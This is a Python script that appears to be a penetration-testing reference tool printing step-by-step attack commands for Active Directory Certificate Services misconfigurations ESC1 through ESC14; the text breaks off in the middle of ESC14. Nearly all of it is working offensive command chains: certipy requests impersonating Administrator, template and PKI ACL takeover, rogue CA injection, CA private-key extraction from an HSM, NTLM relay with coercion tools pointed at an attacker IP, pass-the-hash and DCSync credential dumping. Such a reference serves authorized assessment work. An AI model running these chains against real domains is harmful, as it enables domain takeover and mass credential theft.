#!/usr/bin/env python3
"""
adcs_ref.py — AD CS ESC Exploit Reference Tool
For use during authorized security assessments only.
Displays tool commands for each ESC misconfiguration — does NOT execute exploits.
"""

import sys

RESET  = "\033[0m"
BOLD   = "\033[1m"
CYAN   = "\033[96m"
YELLOW = "\033[38;5;214m"
GREEN  = "\033[92m"
RED    = "\033[91m"
GRAY   = "\033[90m"
WHITE  = "\033[97m"

# ---------------------------------------------------------------------------
# ESC data
# ---------------------------------------------------------------------------

GENERAL = {
    "title": "General — Certipy Enumeration & Auth",
    "description": (
        "Run these first on every engagement to enumerate the AD CS environment "
        "and identify vulnerable templates/CAs. After obtaining a .pfx cert you "
        "can authenticate and retrieve an NT hash or TGT."
    ),
    "steps": [
        {
            "label": "Enumerate all templates and CAs (save output files)",
            "commands": [
                "certipy find -u '<USER>@<DOMAIN>' -p '<PASSWORD>' -dc-ip <DC_IP>",
            ],
        },
        {
            "label": "Enumerate — only show vulnerable items (quick triage)",
            "commands": [
                "certipy find -u '<USER>@<DOMAIN>' -p '<PASSWORD>' -dc-ip <DC_IP> -vulnerable -stdout",
            ],
        },
        {
            "label": "Authenticate with obtained .pfx — get NT hash + TGT",
            "commands": [
                "certipy auth -pfx <USER>.pfx -dc-ip <DC_IP>",
            ],
        },
        {
            "label": "Pass-the-Hash with obtained NT hash (via nxc)",
            "commands": [
                "nxc smb <DC_IP> -u '<USER>' -H '<NT_HASH>'",
                "nxc smb <DC_IP> -u 'administrator' -H '<NT_HASH>' --shares",
            ],
        },
        {
            "label": "DCSync using obtained Domain Admin hash",
            "commands": [
                "impacket-secretsdump '<DOMAIN>/<USER>@<DC_IP>' -hashes ':<NT_HASH>'",
            ],
        },
    ],
    "references": [
        "https://github.com/ly4k/Certipy",
        "https://posts.specterops.io/certified-pre-owned-d95910965cd2",
    ],
}

ESC_DATA = {
    1: {
        "title": "ESC1 — Enrollee Supplies Subject (SAN Abuse)",
        "description": (
            "The template allows the enrollee to specify a subjectAltName (SAN) "
            "AND has a Client Authentication EKU. An attacker can request a cert "
            "as any user (e.g. Domain Admin) by specifying their UPN in the SAN."
        ),
        "indicators": [
            "CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT flag set on template",
            "Client Authentication EKU present",
            "Enrollment rights granted to low-privileged group (e.g. Domain Users)",
            "Manager approval NOT required",
        ],
        "steps": [
            {
                "label": "Request cert as a target user (e.g. Administrator)",
                "commands": [
                    "certipy req -u '<USER>@<DOMAIN>' -p '<PASSWORD>' -ca '<CA_NAME>' "
                    "-template '<VULN_TEMPLATE>' -upn 'administrator@<DOMAIN>' -dc-ip <DC_IP>",
                ],
            },
            {
                "label": "Authenticate with the obtained cert",
                "commands": [
                    "certipy auth -pfx administrator.pfx -dc-ip <DC_IP>",
                ],
            },
        ],
        "references": [
            "https://posts.specterops.io/certified-pre-owned-d95910965cd2",
        ],
    },
    2: {
        "title": "ESC2 — Any Purpose / No EKU Template",
        "description": (
            "The template has the 'Any Purpose' EKU or no EKU at all, making the "
            "cert usable for any purpose including client authentication — even if "
            "Client Auth is not explicitly listed."
        ),
        "indicators": [
            "EKU is 'Any Purpose' (2.5.29.37.0) or empty",
            "Low-privileged enrollment rights",
        ],
        "steps": [
            {
                "label": "Request cert using the Any Purpose template",
                "commands": [
                    "certipy req -u '<USER>@<DOMAIN>' -p '<PASSWORD>' -ca '<CA_NAME>' "
                    "-template '<VULN_TEMPLATE>' -dc-ip <DC_IP>",
                ],
            },
            {
                "label": "Use cert to enroll on behalf of another user (if enrollment agent rights exist — see ESC3)",
                "commands": [
                    "certipy req -u '<USER>@<DOMAIN>' -p '<PASSWORD>' -ca '<CA_NAME>' "
                    "-template '<AUTH_TEMPLATE>' -on-behalf-of '<DOMAIN>\\administrator' "
                    "-pfx '<USER>.pfx' -dc-ip <DC_IP>",
                ],
            },
            {
                "label": "Authenticate with obtained cert",
                "commands": [
                    "certipy auth -pfx administrator.pfx -dc-ip <DC_IP>",
                ],
            },
        ],
        "references": [
            "https://posts.specterops.io/certified-pre-owned-d95910965cd2",
        ],
    },
    3: {
        "title": "ESC3 — Enrollment Agent Abuse",
        "description": (
            "Two-stage abuse: First, request an Enrollment Agent certificate from a "
            "template with the Certificate Request Agent EKU. Then use that cert to "
            "enroll on behalf of any user (including DAs) in a second template that "
            "permits agent enrollment."
        ),
        "indicators": [
            "Template 1: Certificate Request Agent EKU (1.3.6.1.4.1.311.20.2.1), low-priv enrollment",
            "Template 2: Allows enrollment agent enrollment, has Client Auth EKU",
        ],
        "steps": [
            {
                "label": "Step 1 — Request Enrollment Agent certificate",
                "commands": [
                    "certipy req -u '<USER>@<DOMAIN>' -p '<PASSWORD>' -ca '<CA_NAME>' "
                    "-template '<ENROLLMENT_AGENT_TEMPLATE>' -dc-ip <DC_IP>",
                ],
            },
            {
                "label": "Step 2 — Request cert on behalf of target user",
                "commands": [
                    "certipy req -u '<USER>@<DOMAIN>' -p '<PASSWORD>' -ca '<CA_NAME>' "
                    "-template '<CLIENT_AUTH_TEMPLATE>' -on-behalf-of '<DOMAIN>\\administrator' "
                    "-pfx '<USER>.pfx' -dc-ip <DC_IP>",
                ],
            },
            {
                "label": "Authenticate with obtained cert",
                "commands": [
                    "certipy auth -pfx administrator.pfx -dc-ip <DC_IP>",
                ],
            },
        ],
        "references": [
            "https://posts.specterops.io/certified-pre-owned-d95910965cd2",
        ],
    },
    4: {
        "title": "ESC4 — Vulnerable Certificate Template ACLs",
        "description": (
            "A low-privileged user has write permissions over a certificate template "
            "(WriteProperty, WriteDACL, WriteOwner). The attacker modifies the template "
            "to introduce ESC1-style misconfigs, exploits it, then optionally restores."
        ),
        "indicators": [
            "Low-privileged principal has WriteProperty / WriteDACL / WriteOwner on a template",
        ],
        "steps": [
            {
                "label": "Save original template config and overwrite with ESC1-style settings",
                "commands": [
                    "certipy template -u '<USER>@<DOMAIN>' -p '<PASSWORD>' "
                    "-template '<VULN_TEMPLATE>' -save-old -dc-ip <DC_IP>",
                ],
            },
            {
                "label": "Request cert as admin (ESC1 path now open)",
                "commands": [
                    "certipy req -u '<USER>@<DOMAIN>' -p '<PASSWORD>' -ca '<CA_NAME>' "
                    "-template '<VULN_TEMPLATE>' -upn 'administrator@<DOMAIN>' -dc-ip <DC_IP>",
                ],
            },
            {
                "label": "Restore original template",
                "commands": [
                    "certipy template -u '<USER>@<DOMAIN>' -p '<PASSWORD>' "
                    "-template '<VULN_TEMPLATE>' -configuration '<VULN_TEMPLATE>.json' -dc-ip <DC_IP>",
                ],
            },
            {
                "label": "Authenticate",
                "commands": [
                    "certipy auth -pfx administrator.pfx -dc-ip <DC_IP>",
                ],
            },
        ],
        "references": [
            "https://posts.specterops.io/certified-pre-owned-d95910965cd2",
        ],
    },
    5: {
        "title": "ESC5 — Vulnerable PKI Object ACLs",
        "description": (
            "Weak ACLs on PKI-related AD objects other than templates: CA server computer "
            "object, NTAuthCertificates, RootCA object, enrollment service objects. "
            "Can lead to full PKI infrastructure compromise or persistence."
        ),
        "indicators": [
            "Low-priv write access to CA computer object, NTAuthCertificates, or PKI containers in AD",
        ],
        "steps": [
            {
                "label": "Enumerate object ACLs with BloodHound or manual LDAP query",
                "commands": [
                    "bloodhound-python -u '<USER>' -p '<PASSWORD>' -d '<DOMAIN>' "
                    "-dc <DC_IP> -c All",
                    "# Look for: WriteDACL/WriteOwner/GenericWrite on PKI objects",
                ],
            },
            {
                "label": "Use Certipy to check CA permissions",
                "commands": [
                    "certipy find -u '<USER>@<DOMAIN>' -p '<PASSWORD>' -dc-ip <DC_IP> -vulnerable -stdout",
                    "# Review 'Permissions' section for each CA in output",
                ],
            },
            {
                "label": "Path A — WriteOwner/WriteDACL on CA computer object: grant yourself local admin",
                "commands": [
                    "# Take ownership of the CA computer object",
                    "impacket-owneredit -action write -new-owner '<USER>' -target-dn "
                    "'CN=<CA_HOSTNAME>,CN=Computers,<BASE_DN>' "
                    "'<DOMAIN>/<USER>:<PASSWORD>'",
                    "",
                    "# Grant yourself GenericAll on the CA computer object",
                    "impacket-dacledit -action write -rights FullControl -principal '<USER>' "
                    "-target-dn 'CN=<CA_HOSTNAME>,CN=Computers,<BASE_DN>' "
                    "'<DOMAIN>/<USER>:<PASSWORD>'",
                    "",
                    "# Use resource-based constrained delegation or shadow credentials",
                    "# to compromise the CA machine account, then get local admin via pass-the-hash",
                    "nxc smb <CA_IP> -u '<USER>' -H '<MACHINE_NT_HASH>' --local-auth",
                ],
            },
            {
                "label": "Path A — Once local admin on CA: dump CA private key with certipy",
                "commands": [
                    "# From CA server (or via remote reg if CA is on DC)",
                    "certipy ca -backup -ca '<CA_NAME>' -u '<USER>@<DOMAIN>' -p '<PASSWORD>' "
                    "-target <CA_IP>",
                    "# Outputs: <CA_NAME>.pfx",
                ],
            },
            {
                "label": "Path A — Forge cert for Domain Admin using dumped CA key",
                "commands": [
                    "certipy forge -ca-pfx '<CA_NAME>.pfx' -upn 'administrator@<DOMAIN>' "
                    "-subject 'CN=administrator,CN=Users,DC=<DOMAIN>,DC=<TLD>'",
                    "certipy auth -pfx administrator_forged.pfx -dc-ip <DC_IP>",
                ],
            },
            {
                "label": "Path B — WriteOwner on NTAuthCertificates: inject rogue CA → forge certs",
                "commands": [
                    "# Take ownership of NTAuthCertificates",
                    "impacket-owneredit -action write -new-owner '<USER>' -target-dn "
                    "'CN=NTAuthCertificates,CN=Public Key Services,CN=Services,<CONFIG_DN>' "
                    "'<DOMAIN>/<USER>:<PASSWORD>'",
                    "",
                    "# Grant yourself WriteDACL/WriteProperty",
                    "impacket-dacledit -action write -rights FullControl -principal '<USER>' "
                    "-target-dn 'CN=NTAuthCertificates,CN=Public Key Services,CN=Services,<CONFIG_DN>' "
                    "'<DOMAIN>/<USER>:<PASSWORD>'",
                    "",
                    "# Generate a rogue CA key pair",
                    "openssl req -x509 -newkey rsa:2048 -keyout rogue_ca.key "
                    "-out rogue_ca.crt -days 365 -nodes -subj '/CN=RogueCA'",
                    "",
                    "# Add rogue CA cert to NTAuthCertificates (allows DCs to trust forged certs)",
                    "python3 modifyNTAuthCertificates.py -action add -cert rogue_ca.crt "
                    "-u '<USER>@<DOMAIN>' -p '<PASSWORD>' -dc-ip <DC_IP>",
                ],
            },
            {
                "label": "Path B — Forge cert signed by rogue CA and authenticate",
                "commands": [
                    "# Create forged cert signed by rogue CA key",
                    "certipy forge -ca-pfx rogue_ca.pfx -upn 'administrator@<DOMAIN>' "
                    "-subject 'CN=administrator,CN=Users,DC=<DOMAIN>,DC=<TLD>'",
                    "certipy auth -pfx administrator_forged.pfx -dc-ip <DC_IP>",
                ],
            },
            {
                "label": "Path C — WriteOwner on enrollment service object: enable vulnerable template",
                "commands": [
                    "# Take ownership of enrollment service object",
                    "impacket-owneredit -action write -new-owner '<USER>' -target-dn "
                    "'CN=<CA_NAME>,CN=Enrollment Services,CN=Public Key Services,CN=Services,<CONFIG_DN>' "
                    "'<DOMAIN>/<USER>:<PASSWORD>'",
                    "",
                    "# Grant WriteDACL, then use certipy to enable a template (leads to ESC4/ESC1)",
                    "impacket-dacledit -action write -rights FullControl -principal '<USER>' "
                    "-target-dn 'CN=<CA_NAME>,CN=Enrollment Services,...' "
                    "'<DOMAIN>/<USER>:<PASSWORD>'",
                    "certipy ca -u '<USER>@<DOMAIN>' -p '<PASSWORD>' -ca '<CA_NAME>' "
                    "-enable-template '<VULN_TEMPLATE>' -dc-ip <DC_IP>",
                    "# Then exploit via ESC1 or ESC7 path",
                ],
            },
            {
                "label": "DCSync after obtaining Domain Admin NT hash",
                "commands": [
                    "impacket-secretsdump '<DOMAIN>/administrator@<DC_IP>' -hashes ':<NT_HASH>'",
                ],
            },
        ],
        "references": [
            "https://posts.specterops.io/certified-pre-owned-d95910965cd2",
            "https://github.com/fortra/impacket",
        ],
    },
    6: {
        "title": "ESC6 — EDITF_ATTRIBUTESUBJECTALTNAME2 Flag on CA",
        "description": (
            "The CA has the EDITF_ATTRIBUTESUBJECTALTNAME2 flag set. This allows a SAN "
            "to be specified in ANY request, even for templates that don't explicitly "
            "enable it — turning every Client Auth template into an ESC1."
        ),
        "indicators": [
            "EDITF_ATTRIBUTESUBJECTALTNAME2 visible in certipy find output under CA flags",
            "Any template with Client Auth EKU + low-priv enrollment becomes exploitable",
        ],
        "steps": [
            {
                "label": "Confirm flag in certipy output",
                "commands": [
                    "certipy find -u '<USER>@<DOMAIN>' -p '<PASSWORD>' -dc-ip <DC_IP> -vulnerable -stdout",
                    "# Look for: 'User Specified SAN: Enabled' under CA info",
                ],
            },
            {
                "label": "Request cert as Domain Admin using any enrollable Client Auth template",
                "commands": [
                    "certipy req -u '<USER>@<DOMAIN>' -p '<PASSWORD>' -ca '<CA_NAME>' "
                    "-template 'User' -upn 'administrator@<DOMAIN>' -dc-ip <DC_IP>",
                ],
            },
            {
                "label": "Authenticate",
                "commands": [
                    "certipy auth -pfx administrator.pfx -dc-ip <DC_IP>",
                ],
            },
        ],
        "references": [
            "https://posts.specterops.io/certified-pre-owned-d95910965cd2",
        ],
    },
    7: {
        "title": "ESC7 — Vulnerable CA ACLs (ManageCA / ManageCertificates)",
        "description": (
            "A low-privileged user has ManageCA or ManageCertificates rights on the CA. "
            "ManageCA lets you flip the ESC6 flag or enable templates. "
            "ManageCertificates lets you approve pending/failed requests (enables ESC1 bypass of approval)."
        ),
        "indicators": [
            "ManageCA or ManageCertificates right granted to low-priv user in certipy output",
        ],
        "steps": [
            {
                "label": "Option A — ManageCA: Enable the SubCA template",
                "commands": [
                    "certipy ca -u '<USER>@<DOMAIN>' -p '<PASSWORD>' -ca '<CA_NAME>' "
                    "-enable-template 'SubCA' -dc-ip <DC_IP>",
                ],
            },
            {
                "label": "Option A — Request SubCA cert (will fail/pend — save private key)",
                "commands": [
                    "certipy req -u '<USER>@<DOMAIN>' -p '<PASSWORD>' -ca '<CA_NAME>' "
                    "-template 'SubCA' -upn 'administrator@<DOMAIN>' -dc-ip <DC_IP>",
                    "# Note the Request ID from the error output",
                ],
            },
            {
                "label": "Option A — Issue the failed request using ManageCA rights",
                "commands": [
                    "certipy ca -u '<USER>@<DOMAIN>' -p '<PASSWORD>' -ca '<CA_NAME>' "
                    "-issue-request <REQUEST_ID> -dc-ip <DC_IP>",
                ],
            },
            {
                "label": "Option A — Retrieve the issued cert",
                "commands": [
                    "certipy req -u '<USER>@<DOMAIN>' -p '<PASSWORD>' -ca '<CA_NAME>' "
                    "-retrieve <REQUEST_ID> -dc-ip <DC_IP>",
                ],
            },
            {
                "label": "Option B — ManageCA: Enable EDITF_ATTRIBUTESUBJECTALTNAME2 (ESC6)",
                "commands": [
                    "certipy ca -u '<USER>@<DOMAIN>' -p '<PASSWORD>' -ca '<CA_NAME>' "
                    "-enable-san -dc-ip <DC_IP>",
                    "# Then proceed with ESC6 exploitation",
                ],
            },
            {
                "label": "Authenticate",
                "commands": [
                    "certipy auth -pfx administrator.pfx -dc-ip <DC_IP>",
                ],
            },
        ],
        "references": [
            "https://posts.specterops.io/certified-pre-owned-d95910965cd2",
        ],
    },
    8: {
        "title": "ESC8 — NTLM Relay to AD CS HTTP Web Enrollment",
        "description": (
            "AD CS HTTP enrollment endpoints (/certsrv/) do not enforce HTTPS or EPA "
            "(Extended Protection for Authentication). Relay a machine account's NTLM "
            "auth to obtain a certificate for that machine — then use PKINIT to get its "
            "TGT and ultimately DCSync."
        ),
        "indicators": [
            "http:// (not https://) AD CS web enrollment reachable",
            "certipy find output shows 'Web Enrollment: Enabled' without HTTPS enforcement",
        ],
        "steps": [
            {
                "label": "Start Certipy relay listener",
                "commands": [
                    "certipy relay -target 'http://<CA_HOST>/certsrv/certfnsh.asp' "
                    "-template 'DomainController' -dc-ip <DC_IP>",
                ],
            },
            {
                "label": "Coerce DC machine account authentication (pick one coercer)",
                "commands": [
                    "# Option 1 — PetitPotam (MS-EFSRPC)",
                    "python3 PetitPotam.py -u '<USER>' -p '<PASSWORD>' <ATTACKER_IP> <DC_IP>",
                    "",
                    "# Option 2 — Coercer (multi-protocol)",
                    "coercer coerce -u '<USER>' -p '<PASSWORD>' -d '<DOMAIN>' "
                    "--listener-ip <ATTACKER_IP> --target-ip <DC_IP>",
                    "",
                    "# Option 3 — PrinterBug / SpoolSample",
                    "python3 printerbug.py '<DOMAIN>/<USER>:<PASSWORD>@<DC_IP>' <ATTACKER_IP>",
                ],
            },
            {
                "label": "Authenticate with DC cert to get TGT (PKINIT)",
                "commands": [
                    "certipy auth -pfx '<DC_NAME>$.pfx' -dc-ip <DC_IP>",
                ],
            },
            {
                "label": "DCSync using obtained machine account TGT / NT hash",
                "commands": [
                    "impacket-secretsdump -just-dc '<DOMAIN>/<DC_NAME>$@<DC_IP>' "
                    "-hashes ':<NT_HASH>'",
                ],
            },
            {
                "label": "Verify relay endpoint with nxc",
                "commands": [
                    "nxc ldap <DC_IP> -u '<USER>' -p '<PASSWORD>' -M adcs",
                ],
            },
        ],
        "references": [
            "https://posts.specterops.io/certified-pre-owned-d95910965cd2",
            "https://github.com/topotam/PetitPotam",
            "https://github.com/p0dalirius/Coercer",
        ],
    },
    9: {
        "title": "ESC9 — No Security Extension (szOID_NTDS_CA_SECURITY_EXT)",
        "description": (
            "Template has CT_FLAG_NO_SECURITY_EXTENSION set — issued certs won't contain "
            "the SID extension binding them to an AD account. Combined with GenericWrite "
            "over another account, you can change their UPN, request a cert as them, "
            "restore the UPN, then authenticate as that account."
        ),
        "indicators": [
            "CT_FLAG_NO_SECURITY_EXTENSION on template",
            "StrongCertificateBindingEnforcement != 2 on DC",
            "Attacker has GenericWrite over a target account",
        ],
        "steps": [
            {
                "label": "Change target user's UPN to match the high-value target (e.g. Administrator)",
                "commands": [
                    "certipy account update -u '<USER>@<DOMAIN>' -p '<PASSWORD>' "
                    "-user '<TARGET_USER>' -upn 'administrator' -dc-ip <DC_IP>",
                ],
            },
            {
                "label": "Request cert as target user (cert will bind to 'administrator' UPN)",
                "commands": [
                    "certipy req -u '<TARGET_USER>@<DOMAIN>' -p '<TARGET_PASS>' "
                    "-ca '<CA_NAME>' -template '<VULN_TEMPLATE>' -dc-ip <DC_IP>",
                ],
            },
            {
                "label": "Restore original UPN",
                "commands": [
                    "certipy account update -u '<USER>@<DOMAIN>' -p '<PASSWORD>' "
                    "-user '<TARGET_USER>' -upn '<TARGET_USER>@<DOMAIN>' -dc-ip <DC_IP>",
                ],
            },
            {
                "label": "Authenticate as Administrator",
                "commands": [
                    "certipy auth -pfx <TARGET_USER>.pfx -domain '<DOMAIN>' -dc-ip <DC_IP>",
                ],
            },
        ],
        "references": [
            "https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7",
        ],
    },
    10: {
        "title": "ESC10 — Weak Certificate Mapping (Registry Keys)",
        "description": (
            "Weak certificate-to-account mapping via registry: "
            "CertificateMappingMethods includes legacy bits (e.g. 0x4 = Subject/Issuer), "
            "or StrongCertificateBindingEnforcement = 0. "
            "Similar to ESC9 but exploitable even when CT_FLAG_NO_SECURITY_EXTENSION is NOT set."
        ),
        "indicators": [
            "HKLM\\SYSTEM\\CurrentControlSet\\Services\\Kdc\\StrongCertificateBindingEnforcement = 0",
            "HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\Schannel CertificateMappingMethods includes bit 0x4",
            "Attacker has GenericWrite over a target account",
        ],
        "steps": [
            {
                "label": "Case 1 (StrongCertificateBindingEnforcement=0) — same UPN swap as ESC9",
                "commands": [
                    "certipy account update -u '<USER>@<DOMAIN>' -p '<PASSWORD>' "
                    "-user '<TARGET_USER>' -upn 'administrator' -dc-ip <DC_IP>",
                    "certipy req -u '<TARGET_USER>@<DOMAIN>' -p '<TARGET_PASS>' "
                    "-ca '<CA_NAME>' -template '<VULN_TEMPLATE>' -dc-ip <DC_IP>",
                    "certipy account update -u '<USER>@<DOMAIN>' -p '<PASSWORD>' "
                    "-user '<TARGET_USER>' -upn '<TARGET_USER>@<DOMAIN>' -dc-ip <DC_IP>",
                    "certipy auth -pfx <TARGET_USER>.pfx -domain '<DOMAIN>' -dc-ip <DC_IP>",
                ],
            },
            {
                "label": "Case 2 (CertificateMappingMethods bit 0x4) — change sAMAccountName instead",
                "commands": [
                    "certipy account update -u '<USER>@<DOMAIN>' -p '<PASSWORD>' "
                    "-user '<TARGET_USER>' -sam 'administrator' -dc-ip <DC_IP>",
                    "certipy req -u '<TARGET_USER>@<DOMAIN>' -p '<TARGET_PASS>' "
                    "-ca '<CA_NAME>' -template '<VULN_TEMPLATE>' -dc-ip <DC_IP>",
                    "certipy account update -u '<USER>@<DOMAIN>' -p '<PASSWORD>' "
                    "-user '<TARGET_USER>' -sam '<TARGET_USER>' -dc-ip <DC_IP>",
                    "certipy auth -pfx <TARGET_USER>.pfx -domain '<DOMAIN>' -dc-ip <DC_IP>",
                ],
            },
        ],
        "references": [
            "https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7",
        ],
    },
    11: {
        "title": "ESC11 — NTLM Relay to AD CS RPC (MS-ICPR)",
        "description": (
            "The RPC-based certificate enrollment interface (MS-ICPR) does not enforce "
            "signing/encryption when the CA flag IF_ENFORCEENCRYPTICERTREQUEST is not set. "
            "Similar to ESC8 but targets the RPC endpoint instead of HTTP. "
            "Relay a machine account's NTLM auth to the RPC interface to obtain a certificate."
        ),
        "indicators": [
            "certipy find output shows 'Enforce Encryption for Requests: Disabled' on CA",
            "IF_ENFORCEENCRYPTICERTREQUEST flag NOT set on CA",
        ],
        "steps": [
            {
                "label": "Confirm the CA flag is disabled",
                "commands": [
                    "certipy find -u '<USER>@<DOMAIN>' -p '<PASSWORD>' -dc-ip <DC_IP> -stdout",
                    "# Look for: 'Enforce Encryption for Requests: Disabled'",
                ],
            },
            {
                "label": "Start Certipy RPC relay listener",
                "commands": [
                    "certipy relay -target 'rpc://<CA_HOST>' -ca '<CA_NAME>' "
                    "-template 'DomainController'",
                ],
            },
            {
                "label": "Alternatively — use impacket ntlmrelayx targeting RPC",
                "commands": [
                    "impacket-ntlmrelayx -t 'rpc://<CA_HOST>' --adcs "
                    "--template 'DomainController' -smb2support",
                ],
            },
            {
                "label": "Coerce DC machine account authentication (pick one coercer)",
                "commands": [
                    "# Option 1 — PetitPotam (MS-EFSRPC, no creds needed on unpatched)",
                    "python3 PetitPotam.py -u '<USER>' -p '<PASSWORD>' <ATTACKER_IP> <DC_IP>",
                    "",
                    "# Option 2 — Coercer (tries multiple protocols)",
                    "coercer coerce -u '<USER>' -p '<PASSWORD>' -d '<DOMAIN>' "
                    "--listener-ip <ATTACKER_IP> --target-ip <DC_IP>",
                    "",
                    "# Option 3 — DFSCoerce",
                    "python3 dfscoerce.py -u '<USER>' -p '<PASSWORD>' <ATTACKER_IP> <DC_IP>",
                ],
            },
            {
                "label": "Verify coercion opportunity with nxc",
                "commands": [
                    "nxc smb <DC_IP> -u '<USER>' -p '<PASSWORD>' -M petitpotam",
                    "nxc smb <DC_IP> -u '<USER>' -p '<PASSWORD>' -M coerce_plus",
                ],
            },
            {
                "label": "Authenticate with obtained DC cert (PKINIT)",
                "commands": [
                    "certipy auth -pfx '<DC_NAME>$.pfx' -dc-ip <DC_IP>",
                ],
            },
            {
                "label": "DCSync",
                "commands": [
                    "impacket-secretsdump '<DOMAIN>/<DC_NAME>$@<DC_IP>' -hashes ':<NT_HASH>'",
                ],
            },
        ],
        "references": [
            "https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/",
            "https://github.com/topotam/PetitPotam",
            "https://github.com/p0dalirius/Coercer",
        ],
    },
    12: {
        "title": "ESC12 — CA Private Key in PKCS#11 Device (YubiHSM) with Weak PIN",
        "description": (
            "The CA private key is stored in a hardware security module (e.g. YubiHSM) "
            "but the connector config stores the PIN in cleartext or uses a weak default. "
            "An attacker with local access to the CA server can extract the key and "
            "forge certificates for any user."
        ),
        "indicators": [
            "CA server uses YubiHSM or similar HSM",
            "YubiHSM connector config (yubihsm_pkcs11.conf) readable/world-accessible",
            "Default or weak PIN in use",
        ],
        "steps": [
            {
                "label": "Locate YubiHSM connector config on CA server",
                "commands": [
                    "# Requires local/RDP access to CA server",
                    'find / -name "yubihsm_pkcs11.conf" 2>/dev/null',
                    'find / -name "*.conf" | xargs grep -l "yubihsm" 2>/dev/null',
                ],
            },
            {
                "label": "Check registry for connector URL and auth key",
                "commands": [
                    "reg query HKLM\\SOFTWARE\\Yubico\\YubiHSM",
                    "# Look for AuthKeysetPassword or connector URL",
                ],
            },
            {
                "label": "List objects stored in YubiHSM to find CA key handle",
                "commands": [
                    "yubihsm-shell --connector <CONNECTOR_URL> --authkey 0x0001 "
                    "--password '<PIN>' -a list-objects",
                    "# Note the key ID of type 'asymmetric-key' — this is the CA private key",
                ],
            },
            {
                "label": "Export CA private key from YubiHSM (requires exportable key policy)",
                "commands": [
                    "yubihsm-shell --connector <CONNECTOR_URL> --authkey 0x0001 "
                    "--password '<PIN>' -a get-wrapped --wrap-id 0x0001 "
                    "--object-id <KEY_ID> --object-type asymmetric-key --out ca_key_wrapped.bin",
                    "",
                    "# If key is not exportable — extract via PKCS#11 using p11tool",
                    "p11tool --provider /usr/lib/x86_64-linux-gnu/pkcs11/yubihsm_pkcs11.so "
                    "--list-privkeys",
                    "p11tool --provider .../yubihsm_pkcs11.so --export-privkey "
                    "'pkcs11:object=<CERT_LABEL>' --outfile ca_private.pem",
                ],
            },
            {
                "label": "Export the CA certificate (public) from AD or CA server",
                "commands": [
                    "# From the CA server",
                    "certutil -ca.cert ca_cert.crt",
                    "",
                    "# Or via certipy",
                    "certipy find -u '<USER>@<DOMAIN>' -p '<PASSWORD>' -dc-ip <DC_IP>",
                    "# CA cert is embedded in the JSON/stdout output",
                ],
            },
            {
                "label": "Bundle CA key + cert into a PFX for certipy forge",
                "commands": [
                    "openssl pkcs12 -export -inkey ca_private.pem -in ca_cert.crt "
                    "-out ca_bundle.pfx -passout pass:''",
                ],
            },
            {
                "label": "Forge a certificate for Domain Admin",
                "commands": [
                    "certipy forge -ca-pfx ca_bundle.pfx -upn 'administrator@<DOMAIN>' "
                    "-subject 'CN=administrator,CN=Users,DC=<DOMAIN>,DC=<TLD>'",
                ],
            },
            {
                "label": "Authenticate with forged cert and DCSync",
                "commands": [
                    "certipy auth -pfx administrator_forged.pfx -dc-ip <DC_IP>",
                    "impacket-secretsdump '<DOMAIN>/administrator@<DC_IP>' -hashes ':<NT_HASH>'",
                ],
            },
        ],
        "references": [
            "https://posts.specterops.io/certified-pre-owned-d95910965cd2",
            "https://developers.yubico.com/YubiHSM2/Component_Reference/yubihsm-shell/",
        ],
    },
    13: {
        "title": "ESC13 — Issuance Policy OID Linked to Privileged Group",
        "description": (
            "A certificate template has an issuance policy OID that is linked to a "
            "privileged universal group via msDS-OIDToGroupLink. Enrolling in the "
            "template and authenticating with the cert grants membership in that group "
            "for the duration of the Kerberos session."
        ),
        "indicators": [
            "Template has an issuance policy with an OID linked via msDS-OIDToGroupLink",
            "Linked group has privileged rights (e.g. Domain Admins, Enterprise Admins)",
            "Low-priv enrollment rights on the template",
        ],
        "steps": [
            {
                "label": "Enumerate OID-to-group links",
                "commands": [
                    "certipy find -u '<USER>@<DOMAIN>' -p '<PASSWORD>' -dc-ip <DC_IP> -stdout",
                    "# Look for 'Issuance Policies' and 'Group Link' in template output",
                ],
            },
            {
                "label": "Manually check msDS-OIDToGroupLink in LDAP",
                "commands": [
                    "ldapsearch -H ldap://<DC_IP> -D '<USER>@<DOMAIN>' -w '<PASSWORD>' "
                    "-b 'CN=OID,CN=Public Key Services,CN=Services,<CONFIG_DN>' "
                    "'(msDS-OIDToGroupLink=*)' msDS-OIDToGroupLink",
                ],
            },
            {
                "label": "Enroll in the template",
                "commands": [
                    "certipy req -u '<USER>@<DOMAIN>' -p '<PASSWORD>' -ca '<CA_NAME>' "
                    "-template '<VULN_TEMPLATE>' -dc-ip <DC_IP>",
                ],
            },
            {
                "label": "Authenticate — resulting TGT will include privileged group membership",
                "commands": [
                    "certipy auth -pfx <USER>.pfx -dc-ip <DC_IP>",
                    "# Verify group membership in PAC",
                    "python3 describeTicket.py <USER>.ccache | grep -i 'group'",
                ],
            },
        ],
        "references": [
            "https://posts.specterops.io/adcs-esc13-abuse-technique-fda4272fbd53",
        ],
    },
    14: {
        "title": "ESC14 — Explicit Mapping via altSecurityIdentities Abuse",
        "description": (
            "Explicit certificate-to-account mappings set via altSecurityIdentities "
            "attributes can be abused when weak mapping types are used (e.g. "
            "X509IssuerSubject, X509SubjectOnly). If an attacker has GenericWrite over "
            "a privileged account, they can add a mapping that ties an obtained cert "
            "to that account."
        ),
        "indicators": [
            "StrongCertificateBindingEnforcement = 2 (strict) but weak mapping type in altSecurityIdentities",
            "Attacker has GenericWrite over a target privileged account",
        ],
        "steps": [
            {
                "label": "Obtain a certificate (any enrollable template)",
                "commands": [
                    "certipy req -u '<USER>@<DOMAIN>' -p '<PASSWORD>' -ca '<CA_NAME>' "
                    "-template 'User' -dc-ip <DC_IP>",
                ],
            },
            {
                "label": "Extract the certificate subject/issuer for mapping string",
                "commands": [
                    "# Export cert from pfx first",
                    "openssl pkcs12 -in <USER>.pfx -nokeys -out <USER>.crt -passin pass:''",
                    "openssl x509 -in <USER>.crt -noout -subject -issuer",
                    "# Build the mapping string from the output:",
                    "# X509:<I><issuer_DN><S><subject_DN>",
                    "# e.g. X509:<I>DC=com,DC=domain,CN=CA-NAME<S>CN=lowprivuser,...",
                ],
            },
            {
                "label": "Write explicit mapping to target account's altSecurityIdentities",
                "commands": [
                    "# Using PowerView (requires GenericWrite on target)",
